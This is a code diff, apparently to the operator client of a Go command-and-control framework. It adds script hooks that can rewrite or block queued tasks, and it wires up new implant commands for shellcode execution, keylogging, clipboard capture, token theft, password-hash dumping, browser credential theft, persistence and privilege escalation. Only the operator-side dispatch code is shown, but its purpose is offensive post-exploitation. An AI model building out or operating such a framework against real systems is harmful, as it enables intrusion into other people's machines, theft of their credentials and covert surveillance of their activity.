@@ -10,6 +10,7 @@ import (
 	"time"
 
 	"github.com/user/wisp/internal/db"
+	"github.com/user/wisp/internal/server"
 	"github.com/user/wisp/shared/protocol"
 	"github.com/wailsapp/wails/v3/pkg/application"
 )
@@ -75,6 +76,30 @@ func (ss *SessionService) List() ([]SessionInfo, error) {
 
 // SendCommand sends a command to a session.
 func (ss *SessionService) SendCommand(sessionID string, command string, args string) error {
+	// Apply script-registered command aliases / pre-hooks (Aggressor-style).
+	if resolved, resolvedArgs, ok := ss.serverSvc.resolveCommand(command, args); ok {
+		command = resolved
+		args = resolvedArgs
+	}
+
+	// Unified pre-hook: scripts can rewrite the task command/args before it is
+	// queued (this is the task:dispatch hook point; the alias resolver above is
+	// the legacy narrow form of the same mechanism).
+	hctx := server.TriggerHook("task:dispatch", server.HookPre, map[string]any{
+		"session_id": sessionID,
+		"command":    command,
+		"args":       args,
+	}, nil)
+	if hctx.Abort {
+		return fmt.Errorf("command rejected by hook")
+	}
+	if c, ok := hctx.Input["command"].(string); ok && c != "" {
+		command = c
+	}
+	if a, ok := hctx.Input["args"].(string); ok {
+		args = a
+	}
+
 	// Parse command string to command ID
 	cmdID := parseCommand(command)
 	if cmdID == 0 {
@@ -474,12 +499,12 @@ func (ss *SessionService) RemoteDesktopStart(sessionID string, interval, quality
 	}
 
 	args, err := json.Marshal(map[string]any{
-		"frame_task_id":   "rdp:" + sessionID,
-		"interval":        interval,
-		"quality":         quality,
-		"jitter":          jitter,
-		"restore_sleep":   restore,
-		"restore_jitter":  restoreJitter,
+		"frame_task_id":  "rdp:" + sessionID,
+		"interval":       interval,
+		"quality":        quality,
+		"jitter":         jitter,
+		"restore_sleep":  restore,
+		"restore_jitter": restoreJitter,
 	})
 	if err != nil {
 		return err
@@ -694,6 +719,42 @@ func parseCommand(cmd string) uint32 {
 		return protocol.CmdHostLogoff
 	case "lock":
 		return protocol.CmdHostLock
+	case "shellcode":
+		return protocol.CmdExecShellcode
+	case "spawn":
+		return protocol.CmdSpawn
+	case "bof":
+		return protocol.CmdBOF
+	case "jobs":
+		return protocol.CmdJobList
+	case "job-kill":
+		return protocol.CmdJobKill
+	case "portscan":
+		return protocol.CmdPortscan
+	case "socks":
+		return protocol.CmdSocks
+	case "portfwd":
+		return protocol.CmdPortfwd
+	case "keylog":
+		return protocol.CmdKeylog
+	case "clipboard":
+		return protocol.CmdClipboard
+	case "token-steal":
+		return protocol.CmdTokenSteal
+	case "token-revert":
+		return protocol.CmdTokenRevert
+	case "netenum":
+		return protocol.CmdNetEnum
+	case "hashdump":
+		return protocol.CmdHashdump
+	case "browser-creds":
+		return protocol.CmdBrowserCreds
+	case "persist":
+		return protocol.CmdPersist
+	case "getsystem":
+		return protocol.CmdGetSystem
+	case "diag-ssn":
+		return protocol.CmdDiagSSN
 	default:
 		return 0
 	}
